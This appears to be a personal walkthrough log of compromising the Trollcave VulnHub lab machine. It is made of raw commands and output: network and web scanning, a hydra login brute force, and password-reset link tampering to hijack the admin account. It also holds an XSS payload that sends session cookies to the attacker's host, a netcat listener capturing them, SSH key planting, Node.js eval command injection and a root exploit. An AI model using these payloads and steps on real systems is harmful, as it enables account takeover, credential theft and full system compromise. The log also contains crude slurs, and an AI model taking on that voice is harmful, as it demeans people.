----- TROLLCAVE v1.2 -----
https://www.vulnhub.com/entry/trollcave-12,230/


root@7242-alpha-reticuli:~# netdiscover -i wlan0 -r 192.168.1.0/24
 Currently scanning: Finished!   |   Screen View: Unique Hosts                                                                                                                                
                                                                                                                                                                                              
 7 Captured ARP Req/Rep packets, from 6 hosts.   Total size: 348                                                                                                                              
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 192.168.1.68    dc:3a:5e:1f:85:bd      1      42  Roku, Inc.                                                                                                                                 
 192.168.1.69    b0:a7:37:91:c8:ad      2      84  Roku, Inc.                                                                                                                                 
 192.168.1.72    d0:bf:9c:b3:85:ce      1      60  Hewlett Packard                                                                                                                            
 192.168.1.114   50:95:51:83:55:02      1      42  ARRIS Group, Inc.                                                                                                                          
 192.168.1.120   08:00:27:d0:d7:c5      1      60  PCS Systemtechnik GmbH                                                                                                                     
 192.168.1.254   50:95:51:83:55:00      1      60  ARRIS Group, Inc.                                                                                                                          

root@7242-alpha-reticuli:~# 


root@7242-alpha-reticuli:~# nmap -sV -sC -A 192.168.1.120
Starting Nmap 7.70 ( https://nmap.org ) at 2018-06-17 23:01 CDT
Nmap scan report for trollcave.attlocal.net (192.168.1.120)
Host is up (0.00065s latency).
Not shown: 998 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4b:ab:d7:2e:58:74:aa:86:28:dd:98:77:2f:53:d9:73 (RSA)
|   256 57:5e:f4:77:b3:94:91:7e:9c:55:26:30:43:64:b1:72 (ECDSA)
|_  256 17:4d:7b:04:44:53:d1:51:d2:93:e9:50:e0:b2:20:4c (ED25519)
80/tcp open  http    nginx 1.10.3 (Ubuntu)
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: nginx/1.10.3 (Ubuntu)
|_http-title: Trollcave
MAC Address: 08:00:27:D0:D7:C5 (Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.10 - 4.11, Linux 3.16 - 4.6, Linux 3.2 - 4.9, Linux 4.4
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.65 ms trollcave.attlocal.net (192.168.1.120)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.41 seconds
root@7242-alpha-reticuli:~# 


23:04:52-cdowns@7242-alpha-reticuli:~/Github/nikto/program$ ./nikto.pl -host http://192.168.1.120/
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.1.120
+ Target Hostname:    192.168.1.120
+ Target Port:        80
+ Start Time:         2018-06-17 23:05:06 (GMT-5)
---------------------------------------------------------------------------
+ Server: nginx/1.10.3 (Ubuntu)
+ Uncommon header 'x-request-id' found, with contents: 6acf5c57-63f6-4d61-af64-cf7227ba4221
+ Uncommon header 'x-runtime' found, with contents: 0.018205
+ Cookie _thirtytwo_session created without the httponly flag
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ OSVDB-3092: /login/: This might be interesting...
+ OSVDB-3093: /login.php3?reason=chpass2%20: This might be interesting... has been seen in web logs from an unknown scanner.
+ /login.asp: Admin login page/section found.
+ /login.html: Admin login page/section found.
+ /login.php: Admin login page/section found.
+ 7521 requests: 0 error(s) and 8 item(s) reported on remote host
+ End Time:           2018-06-17 23:05:30 (GMT-5) (24 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested


      *********************************************************************
      Portions of the server's headers (nginx/1.10.3) are not in
      the Nikto database or are newer than the known string. Would you like
      to submit this information (*no server specific data*) to CIRT.net
      for a Nikto update (or you may email to sullo@cirt.net) (y/n)? y

+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ ERROR 302: Update failed, please notify sullo@cirt.net of this code.
23:05:44-cdowns@7242-alpha-reticuli:~/Github/nikto/program$ 


root@7242-alpha-reticuli:~# dirb http://192.168.1.120/

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Sun Jun 17 23:06:51 2018
URL_BASE: http://192.168.1.120/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.1.120/ ----
+ http://192.168.1.120/404 (CODE:200|SIZE:1564)                                                                                                                                               
+ http://192.168.1.120/500 (CODE:200|SIZE:1477)                                                                                                                                               
+ http://192.168.1.120/admin (CODE:302|SIZE:92)                                                                                                                                               
+ http://192.168.1.120/admin.cgi (CODE:302|SIZE:92)                                                                                                                                           
+ http://192.168.1.120/admin.php (CODE:302|SIZE:92)                                                                                                                                           
+ http://192.168.1.120/admin.pl (CODE:302|SIZE:92)                                                                                                                                            
+ http://192.168.1.120/comments (CODE:302|SIZE:92)                                                                                                                                            
+ http://192.168.1.120/favicon.ico (CODE:200|SIZE:0)                                                                                                                                          
+ http://192.168.1.120/inbox (CODE:302|SIZE:92)                                                                                                                                               
+ http://192.168.1.120/login (CODE:200|SIZE:2208)                                                                                                                                             
+ http://192.168.1.120/register (CODE:302|SIZE:87)                                                                                                                                            
+ http://192.168.1.120/reports (CODE:302|SIZE:92)                                                                                                                                             
+ http://192.168.1.120/robots.txt (CODE:200|SIZE:202)                                                                                                                                         
+ http://192.168.1.120/users (CODE:302|SIZE:92)                                                                                                                                               
                                                                                                                                                                                              
-----------------
END_TIME: Sun Jun 17 23:07:03 2018
DOWNLOADED: 4612 - FOUND: 14
root@7242-alpha-reticuli:~# 


23:09:41-cdowns@7242-alpha-reticuli:~/Documents/Vulnhub$ cewl -w trollcave_v1.2_wordlist.lst -d 5 -m 7 192.168.1.120
CeWL 5.4.3 (Arkanoid) Robin Wood (robin@digi.ninja) (https://digi.ninja/)
23:09:55-cdowns@7242-alpha-reticuli:~/Documents/Vulnhub$ cat trollcave_v1.2_wordlist.lst 
cooldude
Trollcave
himself
website
Register
anybodyhome
TROLLCAVE
warning
password
comments
coderguy
getting
beliefs
because
trouble
Melbricta
comment
Welcome
TrollCave
community
blogging
friendly
Registration
waiting
passwords
buttons
manually
Politics
religion
discuss
political
religious
monitoring
closely
handing
moderate
Scientologist
believe
administrator
peasants
serious
favourite
Orkneyingers
followers
fastened
cruppers
Poochie
Password
Moderator
Superadmin
working
Regular
Username
account
registrations
implement
noticed
activation
implemented
resource
frustrating
suggestions
forgetting
remember
xentologists
deluded
boasted
victory
against
swelling
23:09:59-cdowns@7242-alpha-reticuli:~/Documents/Vulnhub$

POST /login HTTP/1.1
Host: 192.168.1.120
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://192.168.1.120/login
Content-Type: application/x-www-form-urlencoded
Content-Length: 190
Cookie: _thirtytwo_session=VHRkSXErY0h4OEdqRnRKTEt1SnZLa2RaVm1DaWtmdmNHVXkyZno5eFFnTzA1QzRQa01adTdOMmZhWGdDMVJhcS9IZ3VnNklCKy9NYmFIcEZZSFBxaXNBVHF6ZEdJRmVNdUNyaHErcDd1ZkdnTGd6ZWV5SEtXQUpOSE5RL2RsYkNVdEhadU9ZY0FFeFc5cGFQQzUrNmF3PT0tLXdZeW9kNGNyemVFcVEyQUlVRy9kWkE9PQ%3D%3D--652c83b6ea321ee017751ebd7423f32a635d8ec3
Connection: close
Upgrade-Insecure-Requests: 1

utf8=%E2%9C%93&authenticity_token=OOQFcRpmrTLucyJWS3zOxt3RqKvjNeKhrKUAcgDSkhuSF5JBHFzD9NXxjm6GwAdNkgrN22qIeyyDsOWdmGafUQ%3D%3D&session%5Bname%5D=USER&session%5Bpassword%5D=PASS&commit=Log+in


Hydra Modified --

root@7242-alpha-reticuli:/usr/share/webshells/jsp# hydra http-get-form -U 
Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2018-06-18 21:46:13

Help for module http-get-form:
============================================================================
Module http-get-form requires the page and the parameters for the web form.

By default this module is configured to follow a maximum of 5 redirections in
a row. It always gathers a new cookie from the same URL without variables
The parameters take three ":" separated values, plus optional values.
(Note: if you need a colon in the option string as value, escape it with "\:", but do not escape a "\" with "\\".)

Syntax:   <url>:<form parameters>:<condition string>[:<optional>[:<optional>]
First is the page on the server to GET or POST to (URL).
Second is the POST/GET variables (taken from either the browser, proxy, etc.
 with usernames and passwords being replaced in the "^USER^" and "^PASS^"
 placeholders (FORM PARAMETERS)
Third is the string that it checks for an *invalid* login (by default)
 Invalid condition login check can be preceded by "F=", successful condition
 login check must be preceded by "S=".
 This is where most people get it wrong. You have to check the webapp what a
 failed string looks like and put it in this parameter!
The following parameters are optional:
 C=/page/uri     to define a different page to gather initial cookies from
 (h|H)=My-Hdr\: foo   to send a user defined HTTP header with each request
                 ^USER^ and ^PASS^ can also be put into these headers!
                 Note: 'h' will add the user-defined header at the end
                 regardless it's already being sent by Hydra or not.
                 'H' will replace the value of that header if it exists, by the
                 one supplied by the user, or add the header at the end
Note that if you are going to put colons (:) in your headers you should escape them with a backslash (\).
 All colons that are not option separators should be escaped (see the examples above and below).
 You can specify a header without escaping the colons, but that way you will not be able to put colons
 in the header value itself, as they will be interpreted by hydra as option separators.

Examples:
 "/login.php:user=^USER^&pass=^PASS^:incorrect"
 "/login.php:user=^USER^&pass=^PASS^&colon=colon\:escape:S=authlog=.*success"
 "/login.php:user=^USER^&pass=^PASS^&mid=123:authlog=.*failed"
 "/:user=^USER&pass=^PASS^:failed:H=Authorization\: Basic dT1w:H=Cookie\: sessid=aaaa:h=X-User\: ^USER^:H=User-Agent\: wget"
 "/exchweb/bin/auth/owaauth.dll:destination=http%3A%2F%2F<target>%2Fexchange&flags=0&username=<domain>%5C^USER^&password=^PASS^&SubmitCreds=x&trusted=0:reason=:C=/exchweb"
root@7242-alpha-reticuli:/usr/share/webshells/jsp# 


BruteForce --

21:52:30-cdowns@7242-alpha-reticuli:~/Documents/Vulnhub$ hydra -vV -e ns -f -I -t 1 -w 5 -W 1 -L Trollcave_UserList.txt -P /home/cdowns/Documents/Vulnhub/trollcave_v1.2_wordlist.lst 192.168.1.120 http-post-form "/login:utf8=%E2%9C%93&authenticity_token=OOQFcRpmrTLucyJWS3zOxt3RqKvjNeKhrKUAcgDSkhuSF5JBHFzD9NXxjm6GwAdNkgrN22qIeyyDsOWdmGafUQ%3D%3D&session%5Bname%5D=^USER^&session%5Bpassword%5D=^PASS^&commit=Log+in:S=302"
Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2018-06-18 22:06:09
[DATA] max 1 task per 1 server, overall 1 task, 288 login tries (l:4/p:72), ~288 tries per task
[DATA] attacking http-post-form://192.168.1.120:80//login:utf8=%E2%9C%93&authenticity_token=OOQFcRpmrTLucyJWS3zOxt3RqKvjNeKhrKUAcgDSkhuSF5JBHFzD9NXxjm6GwAdNkgrN22qIeyyDsOWdmGafUQ%3D%3D&session%5Bname%5D=^USER^&session%5Bpassword%5D=^PASS^&commit=Log+in:S=302
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
[ATTEMPT] target 192.168.1.120 - login "coderguy" - pass "coderguy" - 1 of 288 [child 0] (0/0)
[ATTEMPT] target 192.168.1.120 - login "coderguy" - pass "" - 2 of 288 [child 0] (0/0)
[ATTEMPT] target 192.168.1.120 - login "coderguy" - pass "cooldude" - 3 of 288 [child 0] (0/0)
[ATTEMPT] target 192.168.1.120 - login "coderguy" - pass "Trollcave" - 4 of 288 [child 0] (0/0)
[ATTEMPT] target 192.168.1.120 - login "coderguy" - pass "himself" - 5 of 288 [child 0] (0/0)


Find Password reset function --
By guessing rails / password_reset in post --

https://www.railstutorial.org/book/password_reset

Online Users:
	cooldude89

New Users:
	xer
	onlyme
	anybodyhome

http://trollcave/password_resets
Reset email sent. http://trollcave/password_resets/edit.LYDmeeeQS_8NZJIwyWKL9w?name=xer
Goto link above.
Reset password:
	hGhWXwyiwB

Your password has been reset


Steal cooldude89's cookie ! --

root@7242-alpha-reticuli:/usr/share/webshells/php# nc -vlp 80
listening on [any] 80 ..

POST and Submit --
	<img src="/" onerror="xhr = new XMLHttpRequest();xhr.open('GET','http://192.168.1.116/'+document.cookie);xhr.send();"></img>

root@7242-alpha-reticuli:/usr/share/webshells/php# nc -vlp 80
listening on [any] 80 ...
connect to [192.168.1.116] from 7242-alpha-reticuli.attlocal.net [192.168.1.116] 42866
GET /_thirtytwo_session=ekZYQW5hT0JzUm9pcUxlc3B3eUQxcFhZMXF0alUvbTI1SUpWaVplMWlWWlV0ZEJsd1JiSkI3dmw1OU5ZeHordThFSG0xWVZpdG5KTVVxemdPcURtMjNLVmt1Qkl4djhYUUZ3bGUyODBUK21NeTBMT3dmNUhpV01wZk9zRHQ4ZWE1WUVaRy9kbTVHN2ltdFhhN0tCY002M2sxTFB2ZzdlQVJRQzJudnh4Ky9OMnZrd2g5aUtiK1VOd3VMSHNIWDlrdndEeWNLbG9QN1hCVDB1NkhCSXJuUXhlbldqN3lFS0Rzc2V6RTg5OTZoaz0tLUVyMDhqeUxWNG4yUWxPeHJGWlRJVlE9PQ%3D%3D--f95ccf9ad3b5829e5b74b2b6f89b88e8400a4dbc;%20user_id=MTc%3D--1377f59f27c32ae0223ef3ef2791479d35792193;%20remember_token=-TOFaT6c5Pcup9T6dd1kUw HTTP/1.1
Host: 192.168.1.116
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://trollcave/blogs/5
Origin: http://trollcave
Connection: keep-alive


Cookie shit is being retarded.... Let's try dave --
reset passwd for xer / modify link to name=dave
http://trollcave/password_resets/edit.Uxlgd2pjQnS0KuWm1nElPA?name=dave

	P: S1sdFFi2hi

I am DAVE !!! ( ADMIN ).

Demote DRAGON Down ----
POST http://trollcave/users/3/unmod
Until Member -- Reset Password --
http://trollcave/password_reset/new


Check his inbox --
http://trollcave/inbox

Nice !! 

From: King
Subject: password

use it sparingly

uFrrK3dXzWeZQ7JtGgZk4FT

do NOT share it under pain of death

PS: I AM SUPER SERIOUS

Let's login as KIng and enable UPLOADS --

http://trollcave/user_files

 Filename: /home/rails/.ssh/authorized_keys

User: #<User:0x007f7958affb58> 

SSH in --


18:06:53-cdowns@7242-alpha-reticuli:~$ ssh -p 22 -i .ssh/id_rsa rails@trollcave
Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.4.0-128-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

48 packages can be updated.
1 update is a security update.


Last login: Thu Jun 21 00:27:29 2018 from 192.168.1.116
$ id
uid=1001(rails) gid=1001(rails) groups=1001(rails)
$ 


-rw-r--r-- 1 dave dave 655 Oct 23  2017 /home/dave/.profile
-rw-r--r-- 1 dave dave 3771 Oct 23  2017 /home/dave/.bashrc
-rw-r--r-- 1 dave dave 220 Oct 23  2017 /home/dave/.bash_logout
-rw-r--r-- 1 rails rails 0 Oct 21  2016 /home/rails/.cache/motd.legal-displayed
-rw-rw-r-- 1 rails rails 16 Sep 29  2017 /home/rails/.local/share/Ofi Labs/PhantomJS/phantom_repl_history
-rw-r--r-- 1 rails rails 112 Jun 21 00:23 /home/rails/r_rev.rb
-rw-r--r-- 1 rails rails 758 Jun 21 00:27 /home/rails/.ssh/authorized_keys
-rw-r--r-- 1 rails rails 758 Jun 21 00:24 /home/rails/.ssh/id_rsa.pub
-rw-rw-r-- 1 rails rails 25304 Jun 21 00:28 /home/rails/linuxprivchecker.py
-rw-rw-r-- 1 rails rails 182 Jun 21 01:07 /home/rails/.wget-hsts
-rw-rw-r-- 1 rails rails 2466 Sep 28  2017 /home/rails/.gem/specs/api.rubygems.org%443/quick/Marshal.4.8/mechanize-2.7.5.gemspec
-rw-rw-r-- 1 rails rails 1117 Sep 28  2017 /home/rails/.gem/specs/api.rubygems.org%443/quick/Marshal.4.8/net-http-digest_auth-1.4.1.gemspec
-rw-rw-r-- 1 rails rails 13824 Sep 28  2017 /home/rails/.gem/ruby/2.3.0/cache/net-http-digest_auth-1.4.1.gem
-rw-rw-r-- 1 rails rails 124 Mar 21 14:01 /home/rails/.vim/.netrwhist
-rw-r--r-- 1 dragon dragon 655 Oct 23  2017 /home/dragon/.profile
-rw-r--r-- 1 dragon dragon 3771 Oct 23  2017 /home/dragon/.bashrc
-rw-r--r-- 1 dragon dragon 220 Oct 23  2017 /home/dragon/.bash_logout
-rw-rw-r-- 1 king king 2030 Sep 28  2017 /home/king/calc/calc.js
-rw-r--r-- 1 king king 675 Sep 16  2016 /home/king/.profile
-rw-r--r-- 1 king king 3771 Sep 16  2016 /home/king/.bashrc
-rw-r--r-- 1 king king 220 Sep 16  2016 /home/king/.bash_logout
-rw-r--r-- 1 king king 0 Sep 16  2016 /home/king/.sudo_as_admin_successful
-rw-r--r-- 1 coderguy coderguy 655 Oct 23  2017 /home/coderguy/.profile
-rw-r--r-- 1 coderguy coderguy 3771 Oct 23  2017 /home/coderguy/.bashrc
-rw-r--r-- 1 coderguy coderguy 220 Oct 23  2017 /home/coderguy/.bash_logout


-rw-rw-r-- 1 king king 2030 Sep 28  2017 /home/king/calc/calc.js ???

Find out Privs of User --
	-- We knew this already from LinEnum.sh
	-- Also. We are testing local command injection.
	-- Works !

rails@trollcave:/home/king/calc$ vim /tmp/cmd.sh
rails@trollcave:/home/king/calc$ chmod 755 /tmp/cmd.sh 
rails@trollcave:/home/king/calc$ curl "localhost:8888/calc?sum=require('child_process').exec('/tmp/cmd.sh')"
[object Object]rails@trollcave:/home/king/calc$ cat /tmp/info 
Matching Defaults entries for king on trollcave:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User king may run the following commands on trollcave:
    (ALL : ALL) ALL
    (ALL) NOPASSWD: ALL
rails@trollcave:/home/king/calc$ 

	-- Good news bears.... Let's root this box.
	-- No GCC !
	-- Compile remotely

21:46:38-cdowns@7242-alpha-reticuli:/var/www/html$ file sploit0 
sploit0: ELF 64-bit LSB pie executable x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=cf45f7ffc4ee09a55987726999b17d7c49e18c44, not stripped
21:57:23-cdowns@7242-alpha-reticuli:/var/www/html$ 


	-- Time to ROOT THIS BOX --

rails@trollcave:/home/king/calc$ id
uid=1001(rails) gid=1001(rails) groups=1001(rails)
rails@trollcave:/home/king/calc$ cat calc.js 
var http = require("http");
var url = require("url");
var sys = require('sys');
var exec = require('child_process').exec;

// Start server
function start(route)
{
	function onRequest(request, response)
	{
		var theurl = url.parse(request.url);
		var pathname = theurl.pathname;
		var query = theurl.query; 
		console.log("Request for " + pathname + query + " received.");
		route(pathname, request, query, response);
	}

http.createServer(onRequest).listen(8888, '127.0.0.1');
console.log("Server started");
}

// Route request
function route(pathname, request, query, response)
{
	console.log("About to route request for " + pathname);
	switch (pathname)
	{
		// security risk
		/*case "/ping":
			pingit(pathname, request, query, response);
			break;	*/

		case "/":
			home(pathname, request, query, response);
			break;	

		case "/calc":
			calc(pathname, request, query, response);
			break;	

		default:
			console.log("404");
			display_404(pathname, request, response);
			break;
	}
}

function home(pathname, request, query, response)
{
	response.end("<h1>The King's Calculator</h1>" +
			"<p>Enter your calculation below:</p>" +
			"<form action='/calc' method='get'>" +
				"<input type='text' name='sum' value='1+1'>" +
				"<input type='submit' value='Calculate!'>" +
			"</form>" +
			"<hr style='margin-top:50%'>" +
			"<small><i>Powered by node.js</i></small>"
			);
}

function calc(pathname, request, query, response)
{
	sum = query.split('=')[1];
	console.log(sum)
	response.writeHead(200, {"Content-Type": "text/plain"});

	response.end(eval(sum).toString());
}

function ping(pathname, request, query, response)
{
	ip = query.split('=')[1];
	console.log(ip)
	response.writeHead(200, {"Content-Type": "text/plain"});

	exec("ping -c4 " + ip, function(err, stdout, stderr) {
		response.end(stdout);
	});
}

function display_404(pathname, request, response)
{
	response.write("<h1>404 Not Found</h1>");
	response.end("I don't have that page, sorry!");
}

// Start the server and route the requests
start(route);
rails@trollcave:/home/king/calc$ curl "localhost:8888/calc?sum=require('child_process').exec('/tmp/stupid.sh')"
[object Object]rails@trollcave:/home/king/calc$ /tmp/sploit0 
# id
uid=0(root) gid=1001(rails) groups=1001(rails)
# cat /root/flag.txt
et tu, dragon?

c0db34ce8adaa7c07d064cc1697e3d7cb8aec9d5a0c4809d5a0c4809b6be23044d15379c5
# exit
Connection to trollcave closed.
06:52:08-cdowns@7242-alpha-reticuli:~$
# NODEJS IS G4Y -





